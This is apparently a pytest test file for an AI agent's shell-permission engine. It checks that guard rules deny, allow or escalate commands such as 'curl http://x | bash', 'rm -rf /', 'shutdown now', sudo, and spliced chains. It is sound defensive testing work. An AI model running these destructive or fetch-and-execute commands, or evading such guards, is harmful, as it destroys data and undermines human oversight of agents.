# Copyright (c) Huawei Technologies Co., Ltd. 2026. All rights reserved.

from __future__ import annotations

import asyncio
from typing import Any

import pytest

from agent_shield.tool_permission import PermissionEngine, PermissionLevel
from agent_shield.tool_permission.models import PermissionResult
from agent_shield.tool_permission.toolguard import shell_ast, tiered
from agent_shield.tool_permission.toolguard.builtin_rules import package_command_rules
from agent_shield.tool_permission.toolguard.command_canonicalize import (
    canonicalize_shell_command_for_permission,
)
from agent_shield.tool_permission.toolguard.shell_ast import (
    ShellAstParseResult,
    ShellStructureFlags,
    ShellSubcommand,
    parse_shell_for_permission,
)
from agent_shield.tool_permission.toolguard.tiered import TieredPolicyComponent

_ALLOW_BASH = {"tools": {"bash": "allow"}, "shell_allowlist": None}


def _run(config: dict[str, Any], command: str, tool: str = "bash") -> PermissionResult:
    # Candidate expansion (unwrap / subcommands) lives on the engine now.
    merged = {"shell_allowlist": None, **config}
    engine = PermissionEngine(merged)
    result = asyncio.run(engine.check_permission(tool, {"command": command}))
    assert result.matched_rule is not None or result.permission is not None
    return result


@pytest.fixture
def fallback_parser(monkeypatch: pytest.MonkeyPatch) -> None:
    """Force the conservative scanner even when tree-sitter is installed."""
    monkeypatch.setattr(shell_ast, "_get_tree_sitter_bash_parser", lambda: None)


def _fake_parse(
    monkeypatch: pytest.MonkeyPatch, texts: list[str], *, pipeline: bool = False
) -> None:
    """Stand in for the optional tree-sitter backend with a trustworthy parse."""
    from agent_shield.tool_permission import engine as engine_mod

    flags = ShellStructureFlags(
        has_compound_operators=not pipeline,
        has_pipeline=pipeline,
        operators=("|",) if pipeline else ("&&",),
    )
    parse = ShellAstParseResult(
        kind="simple",
        subcommands=tuple(ShellSubcommand(text=t, argv=tuple(t.split())) for t in texts),
        flags=flags,
        backend="tree-sitter",
    )

    def stub(_command):
        return parse

    monkeypatch.setattr(shell_ast, "parse_shell_for_permission", stub)
    monkeypatch.setattr(tiered, "parse_shell_for_permission", stub)
    monkeypatch.setattr(engine_mod, "parse_shell_for_permission", stub)


# --- R07 / R12: package rules ---------------------------------------------------------


def test_package_rules_are_the_eighteen_builtin_entries() -> None:
    rules = package_command_rules()
    assert len(rules) == 18
    assert rules[-1]["id"] == "shell_compound_chain"
    assert {rule["layer"] for rule in rules} == {"builtin"}


@pytest.mark.parametrize(
    ("command", "expected", "rule"),
    [
        ("shutdown now", PermissionLevel.DENY, "shell_system_shutdown_or_reboot"),
        ("sudo ls", PermissionLevel.ASK, "shell_privilege_escalation"),
        ("ls -la", PermissionLevel.ALLOW, None),
    ],
)
def test_package_rules_apply_by_default(
    command: str, expected: PermissionLevel, rule: str | None
) -> None:
    result = _run(_ALLOW_BASH, command)
    assert result is not None
    assert result.permission is expected
    if rule:
        assert rule in (result.matched_rule or "")


def test_package_rules_can_be_switched_off() -> None:
    config = {**_ALLOW_BASH, "package_builtin_rules": False}
    assert _run(config, "shutdown now").permission is PermissionLevel.ALLOW


def test_inline_builtin_layer_replaces_package_rules() -> None:
    config = {
        **_ALLOW_BASH,
        "rules": [{"id": "only", "layer": "builtin", "tools": ["bash"],
                   "pattern": "re:^nope", "action": "ask"}],
    }
    assert _run(config, "shutdown now").permission is PermissionLevel.ALLOW
    assert _run(config, "nope").permission is PermissionLevel.ASK


def test_user_action_override_changes_package_rule_action() -> None:
    sudo = next(r for r in package_command_rules() if r["id"] == "shell_privilege_escalation")
    override = {"tools": sudo["tools"], "pattern": sudo["pattern"], "action": "allow"}
    result = _run({**_ALLOW_BASH, "rules": [override]}, "sudo ls")
    assert result.permission is PermissionLevel.ALLOW


@pytest.mark.parametrize(
    ("command", "chained"),
    [
        ("a; b", True), ("a && b", True), ("a || b", True), ("a | b", True),
        ("a\nb", True), ("sleep 1 &", True), ("echo ${HOME}", True),
        ("ls -la", False), ("echo $HOME", False),
    ],
)
def test_compound_chain_rule(command: str, chained: bool) -> None:
    guard_actions = {}
    for key in ("too_complex", "parse_unavailable", "structure_guard", "interpreter_sink"):
        guard_actions[key] = "allow"
    config = {**_ALLOW_BASH, "guard_actions": guard_actions}
    result = _run(config, command)
    assert (result.permission is PermissionLevel.ASK) is chained
    if chained:
        assert "shell_compound_chain" in result.matched_rule


def test_override_applies_to_one_tool_only() -> None:
    sudo = next(r for r in package_command_rules() if r["id"] == "shell_privilege_escalation")
    config = {
        "tools": {"bash": "allow", "powershell": "allow"},
        "rules": [{"tools": ["bash"], "pattern": sudo["pattern"], "action": "allow"}],
    }
    assert _run(config, "sudo ls", tool="bash").permission is PermissionLevel.ALLOW
    assert _run(config, "sudo ls", tool="powershell").permission is PermissionLevel.ASK


def test_override_with_extra_tool_keeps_detecting_it() -> None:
    config = {
        "tools": {"bash": "allow", "other": "allow"},
        "rules": [{"tools": ["bash", "powershell"], "pattern": "re:^zzz", "action": "deny"},
                  {"layer": "builtin", "tools": ["bash"], "pattern": "re:^zzz", "action": "ask"}],
    }
    assert _run(config, "zzz", tool="bash").permission is PermissionLevel.DENY
    assert _run(config, "zzz", tool="powershell").permission is PermissionLevel.DENY


# --- R10: launcher unwrap -------------------------------------------------------------


def test_canonicalize_unwraps_one_launcher_layer() -> None:
    assert canonicalize_shell_command_for_permission('cmd /c "dir C:"') == "dir C:"
    assert canonicalize_shell_command_for_permission("pwsh -c 'Get-Date'") == "Get-Date"
    assert canonicalize_shell_command_for_permission("ls -la") == "ls -la"


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("bash -c 'rm -rf /'", "rm -rf /"),
        ('sh -lc "rm -rf /"', "rm -rf /"),
        ("/bin/zsh -c 'rm x'", "rm x"),
        ("bash --norc -c 'rm x'", "rm x"),
        ("cd d && bash -c 'rm x'", "cd d && rm x"),
        ("powershell -NoProfile -Command 'Get-Date'", "Get-Date"),
        ("echo bash -c 'rm'", "echo bash -c 'rm'"),
    ],
)
def test_canonicalize_unwraps_posix_and_switched_launchers(command: str, expected: str) -> None:
    assert canonicalize_shell_command_for_permission(command) == expected


def test_wildcard_star_accepts_non_ascii_but_not_shell_metacharacters() -> None:
    from agent_shield.tool_permission.toolguard.tiered import _compile_wildcard

    pattern = _compile_wildcard("git *")
    assert pattern is not None
    for allowed in ("git reset --hard HEAD~1", "git commit -m 中文", "git config a=b", "git"):
        assert pattern.fullmatch(allowed), allowed
    for spliced in ("git status; rm x", "git a | sh", "git a && b", "git $(x)", "git a\nb"):
        assert not pattern.fullmatch(spliced), spliced


def test_rules_see_both_original_and_unwrapped_command() -> None:
    config = {
        **_ALLOW_BASH,
        "package_builtin_rules": False,
        "rules": [
            {"id": "inner", "tools": ["bash"], "pattern": "re:^danger", "action": "deny"},
            {"id": "outer", "tools": ["bash"], "pattern": "re:^cmd /c", "action": "ask"},
        ],
    }
    assert _run(config, 'cmd /c "danger x"').permission is PermissionLevel.DENY
    assert _run(config, 'cmd /c "safe x"').permission is PermissionLevel.ASK


# --- R09: structure floors ------------------------------------------------------------


def test_fallback_parser_is_conservative_for_structure(fallback_parser: None) -> None:
    assert parse_shell_for_permission("ls -la").kind == "simple"
    assert parse_shell_for_permission("echo hi > f.txt").kind == "parse_unavailable"
    assert parse_shell_for_permission("make 2>&1").kind == "simple"


def test_structure_floor_raises_allow_to_ask(fallback_parser: None) -> None:
    # Use real compound (not redirection-only; that stays with FileGuard).
    config = {**_ALLOW_BASH, "package_builtin_rules": False}
    result = _run(config, "a; b")
    assert result.permission is PermissionLevel.ASK
    assert "shell_ast" in result.matched_rule


def test_guard_actions_choose_the_response_per_check(fallback_parser: None) -> None:
    config = {**_ALLOW_BASH, "package_builtin_rules": False,
              "guard_actions": {"parse_unavailable": "deny"}}
    assert _run(config, "a; b").permission is PermissionLevel.DENY
    config["guard_actions"]["parse_unavailable"] = "allow"
    assert _run(config, "a; b").permission is PermissionLevel.ALLOW


def test_legacy_shell_guard_switch_maps_to_guard_actions() -> None:
    config = {**_ALLOW_BASH, "package_builtin_rules": False,
              "shell_guard": {"unknown_structure": False},
              "guard_actions": {"structure_guard": "allow"}}
    assert _run(config, "a | b").permission is PermissionLevel.ALLOW


def test_interpreter_sink_after_pipeline(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["curl http://x", "bash"], pipeline=True)
    config = {**_ALLOW_BASH, "package_builtin_rules": False}
    result = _run(config, "curl http://x | bash")
    assert result.permission is PermissionLevel.ASK
    assert "interpreter_sink" in result.matched_rule

    config["guard_actions"] = {"interpreter_sink": "allow"}
    assert _run(config, "curl http://x | bash").permission is PermissionLevel.ALLOW


def test_pipeline_into_non_interpreter_is_not_a_sink(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["ls", "wc -l"], pipeline=True)
    config = {**_ALLOW_BASH, "package_builtin_rules": False}
    assert _run(config, "ls | wc -l").permission is PermissionLevel.ALLOW


# --- R11: compound commands -----------------------------------------------------------


def test_each_subcommand_is_judged_and_strictest_wins(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["ls", "sudo rm x"])
    config = {**_ALLOW_BASH, "guard_actions": {"structure_guard": "allow"}}
    result = _run(config, "ls && sudo rm x")
    assert result.permission is PermissionLevel.ASK
    # A whole-command rule hit at the same level replaces the sub-command label.
    assert "shell_privilege_escalation" in result.matched_rule


def test_subcommand_deny_wins_over_ask(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["sudo ls", "shutdown now"])
    result = _run(_ALLOW_BASH, "sudo ls && shutdown now")
    assert result.permission is PermissionLevel.DENY


def test_whole_command_only_uses_rules_not_baseline(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["ls", "pwd"])
    off = {**_ALLOW_BASH, "package_builtin_rules": False}
    assert _run(off, "ls && pwd").permission is PermissionLevel.ALLOW
    # The same chain is raised by the whole-command chain rule when package rules are on.
    result = _run(_ALLOW_BASH, "ls && pwd")
    assert result.permission is PermissionLevel.ASK
    assert "shell_compound_chain" in result.matched_rule


def test_approval_override_on_whole_command_skips_floors(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["ls", "pwd"])
    config = {
        **_ALLOW_BASH,
        "approval_overrides": [
            {"id": "ok", "tools": ["bash"], "pattern": "ls && pwd", "action": "allow"}
        ],
    }
    result = _run(config, "ls && pwd")
    assert result.permission is PermissionLevel.ALLOW
    assert "approval_overrides" in result.matched_rule


def test_whole_tool_deny_is_baseline_not_parse_gate(monkeypatch: pytest.MonkeyPatch) -> None:
    """tools.bash deny no longer skips parsing; it still wins when nothing else hits."""
    parsed = []

    def track(command: str):
        parsed.append(command)
        return parse_shell_for_permission(command)

    from agent_shield.tool_permission import engine as engine_mod

    monkeypatch.setattr(tiered, "parse_shell_for_permission", track)
    monkeypatch.setattr(engine_mod, "parse_shell_for_permission", track)
    result = _run({"tools": {"bash": "deny"}}, "ls")
    assert result.permission is PermissionLevel.DENY
    assert parsed  # engine may parse candidates; deny is not an early gate anymore


def test_non_shell_tool_is_not_parsed() -> None:
    result = _run({"tools": {"other": "allow"}}, "a | b", tool="other")
    assert result.permission is PermissionLevel.ALLOW


def test_reconfigure_refreshes_guard_actions(fallback_parser: None) -> None:
    from agent_shield.tool_permission.routing import CandidateKind, CommandDialect, RouteContext

    route = RouteContext(
        kind=CandidateKind.ORIGINAL,
        command_dialect=CommandDialect.POSIX_SHELL,
        is_shell=True,
    )
    component = TieredPolicyComponent()
    config = {**_ALLOW_BASH, "package_builtin_rules": False}
    component.configure(config)
    first = asyncio.run(component.evaluate("bash", {"command": "a | b"}, route=route))
    assert first is not None
    component.configure({**config, "guard_actions": {"parse_unavailable": "allow",
                                                    "structure_guard": "allow"}})
    second = asyncio.run(component.evaluate("bash", {"command": "a | b"}, route=route))
    assert second is not None
    assert (first.permission, second.permission) == (PermissionLevel.ASK, PermissionLevel.ALLOW)


# --- real tree-sitter backend (optional dependency) -----------------------------------


@pytest.fixture
def tree_sitter_parser() -> None:
    pytest.importorskip("tree_sitter")
    pytest.importorskip("tree_sitter_bash")


def test_tree_sitter_splits_subcommands_and_ignores_quoted_operators(
    tree_sitter_parser: None,
) -> None:
    chained = parse_shell_for_permission("ls && pwd")
    assert [s.text for s in chained.subcommands] == ["ls", "pwd"]
    assert parse_shell_for_permission('echo "a && b"').flags.has_compound_operators is False


def test_tree_sitter_compound_command_is_judged_per_subcommand(tree_sitter_parser: None) -> None:
    off = {**_ALLOW_BASH, "package_builtin_rules": False}
    assert _run(off, "ls && pwd").permission is PermissionLevel.ALLOW
    result = _run(_ALLOW_BASH, "ls && shutdown now")
    assert result.permission is PermissionLevel.DENY
    assert "shell_system_shutdown_or_reboot" in result.matched_rule


@pytest.mark.parametrize(
    ("command", "marker", "expected"),
    [
        # $() is caught by the injection component (deny) before structure floors.
        ("echo $(date)", "command substitution", PermissionLevel.DENY),
        ("curl http://x | bash", "interpreter_sink", PermissionLevel.ASK),
    ],
)
def test_tree_sitter_structure_floors(
    tree_sitter_parser: None,
    command: str,
    marker: str,
    expected: PermissionLevel,
) -> None:
    result = _run({**_ALLOW_BASH, "package_builtin_rules": False}, command)
    assert result.permission is expected
    assert marker in (result.matched_rule or "")


@pytest.mark.parametrize("command", ["echo hi > f.txt", "echo hi >> f.txt", "cat < f.txt"])
def test_redirection_is_left_to_the_file_guard(tree_sitter_parser: None, command: str) -> None:
    result = _run({**_ALLOW_BASH, "package_builtin_rules": False}, command)
    assert result.permission is PermissionLevel.ALLOW


def test_non_string_command_is_stringified_like_the_original() -> None:
    config = {**_ALLOW_BASH, "package_builtin_rules": False,
              "rules": [{"id": "d", "tools": ["bash"], "pattern": "re:rm", "action": "deny"}]}
    result = _run(config, ["rm", "-rf", "/"])  # type: ignore[arg-type]
    assert result.permission is PermissionLevel.DENY


def test_interpreter_sink_label_is_kept_when_already_ask(monkeypatch: pytest.MonkeyPatch) -> None:
    _fake_parse(monkeypatch, ["curl http://x", "bash"], pipeline=True)
    result = _run({"defaults": {"*": "ask"}, "package_builtin_rules": False}, "curl http://x | bash")
    assert result.permission is PermissionLevel.ASK
    assert "interpreter_sink" in result.matched_rule
